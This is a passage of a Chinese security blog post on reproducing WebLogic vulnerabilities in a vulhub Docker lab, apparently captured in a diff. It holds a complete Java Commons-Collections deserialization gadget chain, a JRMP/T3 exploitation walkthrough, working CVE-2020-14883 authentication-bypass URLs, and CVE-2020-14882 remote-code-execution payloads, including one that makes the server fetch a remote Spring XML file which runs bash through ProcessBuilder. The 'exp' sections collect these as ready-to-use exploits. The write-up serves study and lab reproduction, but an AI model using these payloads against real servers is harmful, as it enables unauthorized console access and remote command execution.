class="line">        ObjectInputStream in = <span class="keyword">new</span> ObjectInputStream(<span class="keyword">new</span> FileInputStream(<span class="string">&quot;payload.bin&quot;</span>));</span><br><span class="line">        in.readObject();</span><br><span class="line">        in.close();</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<p>得到结果👇</p>
+<p><img src="https://morblogib.oss-cn-shanghai.aliyuncs.com/self/images/save/image-20220115183633314.png" alt="image-20220115183633314"></p>
+<p>事实上 <strong>payload</strong> 部分也是依靠动态代理的形式去调用 <code>invoke</code> 方法以便到达 <code>get</code> 方法的调用。另外，或许 <strong>payload</strong> 还可以在短一些。。</p>
+<p>不妨自己再手撸一个完整的 <strong>payload</strong> 👇</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> org.apache.commons.collections.Transformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.functors.ChainedTransformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.functors.ConstantTransformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.functors.InvokerTransformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.map.LazyMap;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.io.*;</span><br><span class="line"><span class="keyword">import</span> java.lang.annotation.Target;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.*;</span><br><span class="line"><span class="keyword">import</span> java.util.HashMap;</span><br><span class="line"><span class="keyword">import</span> java.util.Map;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Payload</span> </span>&#123;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> Map <span class="title">generate</span><span class="params">(String[] execArgs)</span></span>&#123;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">final</span> Transformer[] transformers = <span class="keyword">new</span> Transformer[] &#123;</span><br><span class="line">                <span class="keyword">new</span> ConstantTransformer(Runtime.class),</span><br><span class="line">                <span class="keyword">new</span> InvokerTransformer(<span class="string">&quot;getMethod&quot;</span>, <span class="keyword">new</span> Class[] &#123;String.class, Class[].class &#125;, <span class="keyword">new</span> Object[] &#123;<span class="string">&quot;getRuntime&quot;</span>, <span class="keyword">new</span> Class[<span class="number">0</span>] &#125;),</span><br><span class="line">                <span class="keyword">new</span> InvokerTransformer(<span class="string">&quot;invoke&quot;</span>, <span class="keyword">new</span> Class[] &#123;Object.class, Object[].class &#125;, <span class="keyword">new</span> Object[] &#123;<span class="keyword">null</span>, <span class="keyword">new</span> Object[<span class="number">0</span>] &#125;),</span><br><span class="line">                <span class="keyword">new</span> InvokerTransformer(<span class="string">&quot;exec&quot;</span>,<span class="keyword">new</span> Class[] &#123; String.class &#125;, execArgs),</span><br><span class="line">        &#125;;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">final</span> ChainedTransformer transformerChain = <span class="keyword">new</span> ChainedTransformer(transformers);</span><br><span class="line"></span><br><span class="line">        <span class="keyword">final</span> Map innerMap = <span class="keyword">new</span> HashMap();</span><br><span class="line"></span><br><span class="line">        <span class="keyword">final</span> Map lazyMap = LazyMap.decorate(innerMap, transformerChain);</span><br><span class="line"></span><br><span class="line">        <span class="keyword">return</span> lazyMap;</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">A2</span> </span>&#123;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> ClassNotFoundException, NoSuchMethodException, InvocationTargetException, InstantiationException, IllegalAccessException, IOException, InterruptedException </span>&#123;</span><br><span class="line"></span><br><span class="line">        <span class="comment">// 生成payload</span></span><br><span class="line">        Map&lt;String, Object&gt; m = Payload.generate(<span class="keyword">new</span> String[] &#123;<span class="string">&quot;calc.exe&quot;</span>&#125;);</span><br><span class="line"></span><br><span class="line">        <span class="comment">// 其实或许并不需要从javax.management.BadAttributeValueException作为入口</span></span><br><span class="line">        Class an = Class.forName(<span class="string">&quot;sun.reflect.annotation.AnnotationInvocationHandler&quot;</span>);</span><br><span class="line">        Constructor co = an.getDeclaredConstructor(Class.class,Map.class);</span><br><span class="line">        co.setAccessible(<span class="keyword">true</span>);</span><br><span class="line"></span><br><span class="line">        <span class="comment">// 生成代理</span></span><br><span class="line">        InvocationHandler an1 = (InvocationHandler) co.newInstance(Target.class,m); <span class="comment">// 第一个实例用作存放payload内容</span></span><br><span class="line">        Map p = (Map) Proxy.newProxyInstance(an.getClassLoader(),<span class="keyword">new</span> Class&lt;?&gt;[]&#123;Map.class&#125;,an1);</span><br><span class="line">        Object an2 = co.newInstance(Target.class,p); <span class="comment">// 第二个实例用作存放第一个实例关于Map接口的代理</span></span><br><span class="line"></span><br><span class="line">        <span class="comment">// 序列化</span></span><br><span class="line">        ObjectOutputStream out = <span class="keyword">new</span> ObjectOutputStream(<span class="keyword">new</span> FileOutputStream(<span class="string">&quot;a.txt&quot;</span>));</span><br><span class="line">        out.writeObject(an2);</span><br><span class="line">        out.close();</span><br><span class="line"></span><br><span class="line">        <span class="comment">// 稍等片刻</span></span><br><span class="line">        Thread.sleep(<span class="number">200</span>);</span><br><span class="line"></span><br><span class="line">        <span class="comment">// 反序列化</span></span><br><span class="line">        ObjectInputStream in = <span class="keyword">new</span> ObjectInputStream(<span class="keyword">new</span> FileInputStream(<span class="string">&quot;a.txt&quot;</span>));</span><br><span class="line">        in.readObject();</span><br><span class="line">        in.close();</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+<p>运行结果👇</p>
+<p><img src="https://morblogib.oss-cn-shanghai.aliyuncs.com/self/images/save/image-20220115184325069.png" alt="image-20220115184325069"></p>
+<p>由此，整个分析过程就结束了，接下来即是利用 <code>jrmp</code> 服务端将这些序列化内容发送给目标客户端，目标客户端会无条件对服务端的内容进行反序列化。</p>
+<h3 id="复现过程-2">- 复现过程 -</h3>
+<p>先使用 <code>docker-compose up -d</code> 将环境起了，然后从攻击机中起一个 <code>jrmp</code> 服务👇</p>
+<p><img src="https://morblogib.oss-cn-shanghai.aliyuncs.com/self/images/save/image-20220115185926749.png" alt="image-20220115185926749"></p>
+<p>接着用 <code>exploit.py</code> 通过 <code>t3</code> 协议让目标使用 <code>jrmp</code> 协议与攻击机起的 <code>jrmp</code> 服务进行通信👇</p>
+<p><img src="https://morblogib.oss-cn-shanghai.aliyuncs.com/self/images/save/image-20220115190141727.png" alt="image-20220115190141727"></p>
+<p>最后检查目标，可以发现 <code>tmp/ok</code> 成功被创建👇</p>
+<p><img src="https://morblogib.oss-cn-shanghai.aliyuncs.com/self/images/save/image-20220115190303021.png" alt="image-20220115190303021"></p>
+<p>此时成功通过反序列化执行 <code>touch /tmp/ok</code> 。</p>
+<h3 id="exp-2">- exp -</h3>
+<p><a target="_blank" rel="noopener" href="https://www.exploit-db.com/exploits/44553">https://www.exploit-db.com/exploits/44553</a></p>
+<hr>
+<h2 id="CVE-2020-14883-CVE-2020-14882">- CVE-2020-14883/CVE-2020-14882 -</h2>
+<p><code>docker-compose.yml</code>：</p>
+<figure class="highlight yml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="attr">version:</span> <span class="string">&#x27;2&#x27;</span></span><br><span class="line"><span class="attr">services:</span></span><br><span class="line"> <span class="attr">weblogic:</span></span><br><span class="line">   <span class="attr">image:</span> <span class="string">vulhub/weblogic:12.2.1.3-2018</span></span><br><span class="line">   <span class="attr">ports:</span></span><br><span class="line">    <span class="bullet">-</span> <span class="string">&quot;7001:7001&quot;</span></span><br></pre></td></tr></table></figure>
+<p>影响版本：</p>
+<ul>
+<li>10.3.6.0</li>
+<li>12.1.3.0</li>
+<li>12.2.1.3</li>
+<li>12.2.1.4</li>
+<li>14.1.1.0</li>
+</ul>
+<h3 id="漏洞分析-3">- 漏洞分析 -</h3>
+<h4 id="CVE-2020-14883">- CVE-2020-14883 -</h4>
+<p>这里从 <code>CVE-2020-14883</code> 看起，这是一个有关认证绕过的漏洞，即可以通过构造一定url的方式以低权限绕过登录访问控制台。先分析一下相应的 <strong>payload</strong> 👇</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://<span class="number">192.168</span><span class="number">.3</span><span class="number">.37</span>:<span class="number">7001</span>/console/images/%252E%252E%252Fconsole.portal</span><br></pre></td></tr></table></figure>
+<p>不难看出这似乎是一个有关路径穿越的绕过方式，例如 <code>%25%2e%25%2e%25%2f</code> 在经过二次url解码实际上是 <code>../</code> ，整条路径的实际路径为 <code>http://192.168.3.37:7001/console/console.portal</code> ，也即是普通访问控制台的路径。至于能够写形成这样的原因，不妨看一下其 <code>web.xml</code> 文件的配置👇</p>
+<p><img src="https://morblogib.oss-cn-shanghai.aliyuncs.com/self/images/save/image-20220116135945027.png" alt="image-20220116135945027"></p>
+<p>可以看到有关url的正则匹配为</p>
+<ul>
+<li><code>/appmanager/*</code></li>
+<li><code>*.portlet</code></li>
+<li><code>*.portion</code></li>
+<li><code>*.portal</code></li>
+</ul>
+<p>因此在进行匹配时，<code>http://192.168.3.37:7001/console/images/%252E%252E%252Fconsole.portal</code> 是能够成功匹配相关视图的。再对比一下相应的 <strong>payload</strong> 不难看出，具体的原理应该是通过插入静态资源路径的方式，让认证服务以为仅仅只是平常的对静态资源的访问，于是就不会进行认证，从而就绕过了认证。</p>
+<p>无奈一直搞不到 <code>weblogic</code> 完整的真源码，无法实时调试，只能勉为其难地简单反编译对比了。</p>
+<p>那么从类比的角度来看，能够满足上面关系的路径应该包含以下👇</p>
+<p><img src="https://morblogib.oss-cn-shanghai.aliyuncs.com/self/images/save/image-20220116152749517.png" alt="image-20220116152749517"></p>
+<p>经过尝试，以下 <strong>payload</strong> 都是可以的：</p>
+<ul>
+<li><code>http://192.168.3.37:7001/console/images/%252E%252E%252Fconsole.portal</code></li>
+<li><code>http://192.168.3.37:7001/console/css/%252E%252E%252Fconsole.portal</code></li>
+<li><code>http://192.168.3.37:7001/console/bea-helpsets/%252E%252E%252Fconsole.portal</code></li>
+</ul>
+<p>再来看认证函数👇</p>
+<p><img src="https://morblogib.oss-cn-shanghai.aliyuncs.com/self/images/save/image-20220116161657818.png" alt="image-20220116161657818"></p>
+<p>由于无法进行调试，这里一个个值来看，不过首先要说明的是在传入的参数中：</p>
+<ul>
+<li><code>request = 请求内容</code></li>
+<li><code>response = 回应内容</code></li>
+<li><code>checkAllResources = false</code></li>
+<li><code>applyAuthFilters = true</code></li>
+<li><code>isRecursiveCall = false</code></li>
+</ul>
+<p>接着跟进 <code>RequestDispatcher rd = invokePreAuthFilters(request, response);</code> 👇</p>
+<p><img src="https://morblogib.oss-cn-shanghai.aliyuncs.com/self/images/save/image-20220116162104488.png" alt="image-20220116162104488"></p>
+<p>再跟进 <code>RequestDispatcher rd = getAuthFilterRD();</code> 👇</p>
+<p><img src="https://morblogib.oss-cn-shanghai.aliyuncs.com/self/images/save/image-20220116162152010.png" alt="image-20220116162152010"></p>
+<p>那么查看 <code>this.authFilterRD</code> 的值👇</p>
+<p><img src="https://morblogib.oss-cn-shanghai.aliyuncs.com/self/images/save/image-20220116162256806.png" alt="image-20220116162256806"></p>
+<p>由此可知，<code>RequestDispatcher rd = null;</code> 。</p>
+<p>接着这里默认设置了 <code>authorized = true;</code> ，往下看，由于 <code>checkAllResources = false</code> 则 <code>resourceConstraint = getContraint(request)</code> ，而 <code>getContraint(request)</code> 这个方法实现的内容实际上是对请求内容使用 <code>ResourceContraint</code> 类进行一个包装👇</p>
+<p><img src="https://morblogib.oss-cn-shanghai.aliyuncs.com/self/images/save/image-20220116164243660.png" alt=""></p>
+<p>由于无法进行动态调试，就不跟进了。往下看，可以看到其中有一个 <code>if (!... &amp;&amp; resourceConstraint.isForbidden())</code> 的条件判断，跟进 <code>isForbidden()</code> 方法👇</p>
+<p><img src="https://morblogib.oss-cn-shanghai.aliyuncs.com/self/images/save/image-20220116164435861.png" alt="image-20220116164435861"></p>
+<p>可以看到 <code>forbidden</code> 属性的默认值为 <code>false</code> ，而实际上返回的确实也是 <code>false</code> 。那么这个条件里的内容也就是关于对表单进行认证的部分就不会执行，而是直接跳到下一部分👇</p>
+<p><img src="https://morblogib.oss-cn-shanghai.aliyuncs.com/self/images/save/image-20220116170103822.png" alt="image-20220116170103822"></p>
+<p>由此导致认证通过的关键点即是 <code>authorized = this.delegateModule.isAuthorized(request, response, resourceConstraint, applyAuthFilters);</code> 这条语句了。其中整个认证的流程如下👇</p>
+<p><img src="https://morblogib.oss-cn-shanghai.aliyuncs.com/self/images/save/image-20220116163201634.png" alt="image-20220116163201634"></p>
+<p>能够认证成功的原因应该是当请求内容中包含静态资源路径时，在包装成 <code>ResourceContraint</code> 类的途中，其 <code>unrestricted</code> 的值为 <code>true</code> 导致能够无限制的访问，进而能够绕过认证。</p>
+<p><img src="https://morblogib.oss-cn-shanghai.aliyuncs.com/self/images/save/image-20220116172220708.png" alt="image-20220116172220708"></p>
+<p>但这还仅仅是绕过了认证，即只能够获得访问的权限，此时还需要一个类似跨目录的形式将url中的 <code>%252E%252E%252F</code> 内容解析成 <code>../</code> 的形式以便达成最终路径 <code>/console/console.portal</code> 。</p>
+<p>不妨来看下对上下文的处理，在 <code>com.bea.netuix.servlets.UIServletInternal</code> 类的 <code>getTree</code> 方法中存在对url的二次解码👇</p>
+<p><img src="https://morblogib.oss-cn-shanghai.aliyuncs.com/self/images/save/image-20220116181952934.png" alt="image-20220116181952934"></p>
+<p>且在对上下文的创建过程中用到了这个 <code>getTree</code> 方法👇</p>
+<p><img src="https://morblogib.oss-cn-shanghai.aliyuncs.com/self/images/save/image-20220116182431388.png" alt="image-20220116182431388"></p>
+<p>那么此时显而易见 <code>/console/images/%252E%252E%252Fconsole.portal</code> 会由二次解码成 <code>/console/images/../console.portal</code> ；并且在上边已经由包含静态资源的形式绕过了认证，那么最终也就能从 <code>/console/console.portal</code> 进入。</p>
+<h4 id="CVE-2020-14882">- CVE-2020-14882 -</h4>
+<p>还是先来看一下 <strong>payload</strong> 👇</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://<span class="number">192.168</span><span class="number">.3</span><span class="number">.37</span>:<span class="number">7001</span>/console/css/%252e%252e%252fconsole.portal?_nfpb=true&amp;_pageLabel=&amp;handle=com.tangosol.coherence.mvel2.sh.ShellSession(<span class="string">&quot;java.lang.Runtime.getRuntime().exec(&#x27;touch%20/tmp/ok&#x27;);&quot;</span>)</span><br></pre></td></tr></table></figure>
+<p>显然前面的部分即是上边 <code>CVE-2020-14883</code> 关于控制台认证的绕过，后面接着的 <code>handle=.......</code> 就是该CVE的关键部分了。那么先看 <code>com.bea.console.handles.HandleFactory</code> 类的 <code>getHandle</code> 方法👇</p>
+<p><img src="https://morblogib.oss-cn-shanghai.aliyuncs.com/self/images/save/image-20220116193959688.png" alt="image-20220116193959688"></p>
+<p>由此可知，这里存在一个形如 <code>new [可控类名]([可控String型参数]);</code> 的调用形式。</p>
+<p>不妨根据 <strong>payload</strong> 查看一下 <code>com.tangosol.coherence.mvel2.sh.ShellSession</code> 类内容👇</p>
+<p><img src="https://morblogib.oss-cn-shanghai.aliyuncs.com/self/images/save/image-20220116201108471.png" alt="image-20220116201108471"></p>
+<p>其实也就是将要执行的java代码作为 <code>com.tangosol.coherence.mvel2.sh.ShellSession</code> 的构造参数，依靠上边的 <code>new [可控类名]([可控String型参数]);</code> 去执行java代码，从而达成远程命令执行。</p>
+<p>然而 <code>com.tangosol.coherence.mvel2.sh.ShellSession</code> 类只有在 <code>weblogic 12.2.1</code> 以上才可以利用，再看另一个通杀的 <strong>payload</strong> 👇</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://<span class="number">192.168</span><span class="number">.3</span><span class="number">.37</span>:<span class="number">7001</span>/console/css/%252e%252e%252fconsole.portal?_nfpb=true&amp;_pageLabel=&amp;handle=com.bea.core.repackaged.springframework.context.support.FileSystemXmlApplicationContext(<span class="string">&quot;http://example.com/rce.xml&quot;</span>)</span><br></pre></td></tr></table></figure>
+<p>看的出来这个让其加载远程的xml文件，并执行其中的命令。不妨跟进 <code>com.bea.core.repackaged.springframework.context.support.FileSystemXmlApplicationContext</code> 类查看👇</p>
+<p><img src="https://morblogib.oss-cn-shanghai.aliyuncs.com/self/images/save/image-20220116204915304.png" alt="image-20220116204915304"></p>
+<p>在费劲周折地对了这个url进行处理后👇</p>
+<p><img src="https://morblogib.oss-cn-shanghai.aliyuncs.com/self/images/save/image-20220116211146395.png" alt="image-20220116211146395"></p>
+<p>会进行刷新操作刷新将远程xml文件的内容解析并执行，比如可以用以下的xml内容执行系统命令👇</p>
+<figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?xml version=&quot;1.0&quot; encoding=&quot;UTF-8&quot; ?&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">beans</span> <span class="attr">xmlns</span>=<span class="string">&quot;http://www.springframework.org/schema/beans&quot;</span></span></span><br><span class="line"><span class="tag">   <span class="attr">xmlns:xsi</span>=<span class="string">&quot;http://www.w3.org/2001/XMLSchema-instance&quot;</span></span></span><br><span class="line"><span class="tag">   <span class="attr">xsi:schemaLocation</span>=<span class="string">&quot;http://www.springframework.org/schema/beans http://www.springframework.org/schema/beans/spring-beans.xsd&quot;</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">bean</span> <span class="attr">id</span>=<span class="string">&quot;pb&quot;</span> <span class="attr">class</span>=<span class="string">&quot;java.lang.ProcessBuilder&quot;</span> <span class="attr">init-method</span>=<span class="string">&quot;start&quot;</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">constructor-arg</span>&gt;</span></span><br><span class="line">          <span class="tag">&lt;<span class="name">list</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">value</span>&gt;</span>bash<span class="tag">&lt;/<span class="name">value</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">value</span>&gt;</span>-c<span class="tag">&lt;/<span class="name">value</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">value</span>&gt;</span>&lt;![CDATA[touch /tmp/ok2]]&gt;<span class="tag">&lt;/<span class="name">value</span>&gt;</span></span><br><span class="line">          <span class="tag">&lt;/<span class="name">list</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;/<span class="name">constructor-arg</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">bean</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">beans</span>&gt;</span></span><br></pre></td></tr></table></figure>
+<p>由于无法进行动态调试，就先不深入往下看是如何解析了。</p>
+<h3 id="复现过程-3">- 复现过程 -</h3>
+<p>还是先使用 <code>docker-compose up -d</code> 将环境起了，然后访问以下任意url👇</p>
+<ul>
+<li><code>http://192.168.3.37:7001/console/images/%252E%252E%252Fconsole.portal</code></li>
+<li><code>http://192.168.3.37:7001/console/css/%252E%252E%252Fconsole.portal</code></li>
+<li><code>http://192.168.3.37:7001/console/bea-helpsets/%252E%252E%252Fconsole.portal</code></li>
+</ul>
+<p>都可以成功进入控制台👇</p>
+<p><img src="https://morblogib.oss-cn-shanghai.aliyuncs.com/self/images/save/image-20220116211859541.png" alt="image-20220116211859541"></p>
+<p>此时 <code>CVE-2020-14883</code> 复现完毕，接着将以下内容放入任意url👇</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?_nfpb=true&amp;_pageLabel=&amp;handle=com.tangosol.coherence.mvel2.sh.ShellSession(<span class="string">&quot;java.lang.Runtime.getRuntime().exec(&#x27;touch%20/tmp/ok1&#x27;);&quot;</span>)</span><br></pre></td></tr></table></figure>
+<p>比如👇</p>
+<p><img src="https://morblogib.oss-cn-shanghai.aliyuncs.com/self/images/save/image-20220116213106230.png" alt="image-20220116213106230"></p>
+<p>可以发现成功执行了命令。</p>
+<p>再试试加载远程xml的 <strong>payload</strong> ，先随意起一个网络环境，并将xml文件准备好后开整👇</p>
+<p><img src="https://morblogib.oss-cn-shanghai.aliyuncs.com/self/images/save/image-20220116214114273.png" alt="image-20220116214114273"></p>
+<p>此时也成功执行了命令。</p>
+<h3 id="exp-3">- exp -</h3>
+<h4 id="CVE-2020-14883-2">- CVE-2020-14883 -</h4>
+<p>以下均可绕过认证到达控制台👇</p>
+<ul>
+<li><code>http://192.168.3.37:7001/console/images/%252E%252E%252Fconsole.portal</code></li>
+<li><code>http://192.168.3.37:7001/console/css/%252E%252E%252Fconsole.portal</code></li>
+<li><code>http://192.168.3.37:7001/console/bea-helpsets/%252E%252E%252Fconsole.portal</code></li>
+</ul>
+<h4 id="CVE-2020-14882-2">- CVE-2020-14882 -</h4>
+<p>使用 <code>com.tangosol.coherence.mvel2.sh.ShellSession</code> 类的构造方法👇</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://<span class="number">192.168</span><span class="number">.3</span><span class="number">.37</span>:<span class="number">7001</span>/console/css/%252e%252e%252fconsole.portal?_nfpb=true&amp;_pageLabel=&amp;handle=com.tangosol.coherence.mvel2.sh.ShellSession(<span class="string">&quot;java.lang.Runtime.getRuntime().exec(&#x27;touch%20/tmp/ok&#x27;);&quot;</span>)</span><br></pre></td></tr></table></figure>
+<p>使用 <code>com.bea.core.repackaged.springframework.context.support.FileSystemXmlApplicationContext</code> 的构造方法👇</p>
+<p><code>dm.xml</code> 👇</p>
+<figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?xml version=&quot;1.0&quot; encoding=&quot;UTF-8&quot; ?&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">beans</span> <span class="attr">xmlns</span>=<span class="string">&quot;http://www.springframework.org/schema/beans&quot;</span></span></span><br><span class="line"><span class="tag">   <span class="attr">xmlns:xsi</span>=<span class="string">&quot;http://www.w3.org/2001/XMLSchema-instance&quot;</span></span></span><br><span class="line"><span class="tag">   <span class="attr">xsi:schemaLocation</span>=<span class="string">&quot;http://www.springframework.org/schema/beans http://www.springframework.org/schema/beans/spring-beans.xsd&quot;</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">bean</span> <span class="attr">id</span>=<span class="string">&quot;pb&quot;</span> <span class="attr">class</span>=<span class="string">&quot;java.lang.ProcessBuilder&quot;</span> <span class="attr">init-method</span>=<span class="string">&quot;start&quot;</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">constructor-arg</span>&gt;</span></span><br><span class="line">          <span class="tag">&lt;<span class="name">list</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">value</span>&gt;</span>bash<span class="tag">&lt;/<span class="name">value</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">value</span>&gt;</span>-c<span class="tag">&lt;/<span class="name">value</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">value</span>&gt;</span>&lt;![CDATA[touch /tmp/ok2]]&gt;<span class="tag">&lt;/<span class="name">value</span>&gt;</span></span><br><span class="line">          <span class="tag">&lt;/<span class="name">list</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;/<span class="name">constructor-arg</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">bean</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">beans</span>&gt;</span></span><br></pre></td></tr></table></figure>
+<p>访问的url内容👇</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://<span class="number">192.168</span><span class="number">.3</span><span class="number">.37</span>:<span class="number">7001</span>/console/css/%252e%252e%252fconsole.portal?_nfpb=true&amp;_pageLabel=&amp;handle=com.bea.core.repackaged.springframework.context.support.FileSystemXmlApplicationContext(<span class="string">&quot;http://example.com/rce.xml&quot;</span>)</span><br></pre></td></tr></table></figure>
+
+
+        <hr>
+        <!-- Pager -->
+        <ul class="pager">
+          
+          
+          <li class="next">
+            <a href="/posts/2946623354/" data-toggle="tooltip" data-placement="top" title="总结 - ctf中flask的ssti(一)">Next Post &rarr;</a>
+          </li>
+          
+        </ul>
+
+        
+        <!-- tip start -->
+        <!-- tip -->
+<!-- tip start -->
+<div class="tip">
+  <p>
+    
+      如果您喜欢此博客或发现它对您有用，则欢迎对此发表评论。也欢迎您共享此博客，以便更多人可以参与。如果博客中使用的图像侵犯了您的版权，请与作者联系以将其删除。谢谢 ！
+    
+  </p>
+</div>
+<!-- tip end -->
+
+        <!-- tip end -->
+        
+
+        
+        <!-- Sharing Srtart -->
+        <!-- Social Social Share Post -->
+<!-- Docs:https://github.com/overtrue/share.js -->
+
+<div class="social-share" data-initialized="true" data-disabled="tencent ,douban ,qzone ,linkedin ,facebook ,google ,diandian" data-wechat-qrcode-helper="" align="center">
+  <ul class="list-inline text-center social-share-ul">
+    <li class="social-share-li">
+      <a target="_blank" class="social-share-icon icon-twitter">
+        <i class="fa fa-twitter fa-1x" aria-hidden="true"></i>
+      </a>
+    </li>
+    <li class="social-share-li">
+      <a class="social-share-icon icon-wechat">
+        <i class="fa fa-weixin fa-1x" aria-hidden="true"></i>
+      </a>
+    </li>
+    <li class="social-share-li">
+      <a target="_blank" class="social-share-icon icon-weibo">
+        <i class="fa fa-weibo fa-1x" aria-hidden="true"></i>
+      </a>
+    </li>
+    <li class="social-share-li">
+      <a target="_blank" class="social-share-icon icon-qq">
+        <i class="fa fa-qq fa-1x" aria-hidden="true"></i>
+      </a>
+    </li>
+    <li class="social-share-li">
+      <a target="_blank" class="social-share-icon" href="mailto:?subject=漏洞复现 - weblogic(一)&body=Hi,I found this website and thought you might like it https://morblog.cc/posts/3778261501/">
+        <i class="fa fa-envelope fa-1x" aria-hidden="true"></i>
+      </a>
+    </li>
+  </ul>
+</div>
+
+<!-- css & js -->
+<!-- <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/social-share.js/1.0.16/css/share.min.css"> -->
+<script defer="defer" async="true" src="https://cdnjs.cloudflare.com/ajax/libs/social-share.js/1.0.16/js/social-share.min.js"></script>
+
+        <!-- Sharing End -->
+        
+        <hr>
+
+        <!-- comments start -->
+        <!-- 1. gitalk comment -->
+
+
+<!-- 2. gitment comment -->
+
+
+<!-- 4. disqus comment -->
+
+  <!-- disqus comment start -->
+
+  <div class="comment">
+    <div id="disqus_thread" class="disqus-thread"></div>
+  </div>
+
+  <!-- disqus embedded js code start (one page only need to embed once) -->
+  <script type="text/javascript">
+    /* * * CONFIGURATION VARIABLES * * */
+    var disqus_shortname = "moryyds-1";
+    var disqus_identifier = "https://morblog.cc/posts/3778261501/";
+    var disqus_url = "https://morblog.cc/posts/3778261501/";
+
+    (function () {
+      var dsq = document.createElement('script');
+      dsq.type = 'text/javascript';
+      dsq.async = true;
